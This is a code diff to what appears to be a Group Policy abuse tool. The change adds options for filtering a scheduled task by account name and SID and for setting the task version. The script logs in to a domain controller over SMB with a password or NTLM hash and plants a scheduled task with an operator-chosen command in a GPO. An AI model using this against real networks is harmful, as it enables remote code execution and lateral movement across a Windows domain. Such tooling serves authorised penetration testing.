@@ -41,6 +41,11 @@ parser.add_argument('-ccache', action='store', help='ccache file name (must be i
 parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
 parser.add_argument('-r', action='store_true', help='Force replace ScheduleTask')
 parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
+parser.add_argument('-filter', action='count', default=0, help='Add filter to GPO')
+parser.add_argument('-samaccount', action='store', help='Samaccount name from filter')
+parser.add_argument('-sid', action='store', help='SID object')
+parser.add_argument('-tv', action='store', default="1.4", help='Task version by default 1.4')
+parser.add_argument('-filterfile', type=str, help='File with Samaccount:SID to add more than one filter')
 
 if len(sys.argv) == 1:
     parser.print_help()
@@ -63,6 +68,21 @@ else:
     logging.getLogger().setLevel(logging.ERROR)
 
 domain, username, password = parse_credentials(options.target)
+
+if options.filter:
+    if getattr(options, 'samaccount', None) and getattr(options, 'sid', None):
+        archivo = "NOT_NEEDING"
+
+    elif options.filterfile:
+        try:
+            archivo = open (options.filterfile, "r")
+            archivo.close()
+        except:
+            print("The input file doesn't exist")
+            exit()
+    else:
+        print("You need add the computer's SID and samaccount which is going to apply the filters or a file with samaccount:SID")
+        exit()
 
 if options.dc_ip:
     dc_ip = options.dc_ip
@@ -98,16 +118,6 @@ else:
     url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hashes.split(":")[1], dc_ip)
     lmhash, nthash = options.hashes.split(":")
 
-
-def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
-    try:
-        smb_session = SMBConnection(address, target_ip)
-        smb_session.login(username, password, domain, lmhash, nthash)
-        return smb_session
-    except Exception as e:
-        logging.error("Connection error")
-        return False
-
 try:
     smb_session = SMBConnection(dc_ip, dc_ip)
     if options.k:
@@ -119,6 +129,11 @@ except Exception as e:
     sys.exit(1)
 
 try:
+    if options.file:
+        archivo = options.file
+    else:
+        archivo = "NOT_NEEDING"
+
     gpo = GPO(smb_session)
     task_name = gpo.update_scheduled_task(
         domain=domain,
@@ -129,15 +144,37 @@ try:
         powershell=options.powershell,
         command=options.command,
         gpo_type="user" if options.user else "computer",
+        filter_gpo=options.filter,
+        samaccount=options.samaccount,
+        user_sid=options.sid,
+        task_version=options.tv,
+        archivo=archivo,
         force=options.f,
         replace=options.r
     )
     if task_name:
-        if gpo.update_versions(url, domain, options.gpo_id, gpo_type="user" if options.user else "computer",):
-            logging.info("Version updated")
+        if options.filter:
+            if gpo.update_versions(url, domain, options.gpo_id, "user" if options.user else "computer", options.samaccount, options.sid, options.tv, archivo):
+                logging.info("Version updated")
+            else:
+                logging.error("Error while updating versions")
+                sys.exit(1)
         else:
-            logging.error("Error while updating versions")
-            sys.exit(1)
-        logging.success("ScheduledTask {} created!".format(task_name))
+            if gpo.update_versions(url, domain, options.gpo_id, gpo_type="user" if options.user else "computer", samaccount="None", user_sid="None", task_version="1.3", archivo="NOT_NEEDING"):
+                logging.info("Version updated")
+            else:
+                logging.error("Error while updating versions")
+                sys.exit(1)
+            logging.success("ScheduledTask {} created!".format(task_name))
 except Exception as e:
     logging.error("An error occurred. Use -vv for more details", exc_info=True)
+
+def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
+    try:
+        smb_session = SMBConnection(address, target_ip)
+        smb_session.login(username, password, domain, lmhash, nthash)
+        return smb_session
+    except Exception as e:
+        logging.error("Connection error")
+        return False
+
